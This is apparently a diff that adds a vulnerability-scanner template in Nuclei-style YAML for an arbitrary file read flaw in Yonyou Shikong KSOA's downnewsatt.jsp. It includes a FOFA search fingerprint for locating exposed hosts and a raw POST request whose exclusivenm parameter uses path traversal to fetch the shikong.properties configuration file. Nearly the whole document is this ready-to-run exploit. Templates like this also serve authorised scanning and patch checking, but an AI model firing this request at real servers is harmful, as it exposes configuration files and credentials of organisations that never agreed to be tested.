@@ -1,0 +1,32 @@
+id: poc-gty452vxzlgpci4a
+info:
+  name: 用友时空KSOA downnewsatt.jsp 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gty452vxzlgpci4a'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gty452vxzlgpci4a
+    fofa: body="onmouseout=\"this.classname='btn btnOff'\"" || body="productKSOA.jpg" || body="check.jsp?pid=" && title="企业信息系统门户"
+http:
+- raw:
+  - 'POST /newspublish/downnewsatt.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
+
+
+    exclusivenm=../../WEB-INF/classes/shikong.properties'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
